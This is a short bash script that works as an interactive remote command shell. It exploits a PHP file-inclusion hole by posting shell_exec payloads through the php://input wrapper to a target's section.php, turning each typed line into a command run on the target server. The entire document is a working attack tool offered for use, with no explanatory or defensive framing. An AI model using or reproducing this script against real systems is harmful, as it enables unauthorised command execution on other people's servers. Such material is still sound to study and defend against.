#!/bin/bash
# quick shell for reading commands and exploiting bad php

echo "usage> ./php-input-shell.sh <HOST>"

HOST=$1
echo -n '>'
while read CMD; do
    curl -s -d "<?php echo shell_exec('$CMD'); ?>" "http://$HOST/section.php?page=php://input"
    echo
    echo -n '>'
done
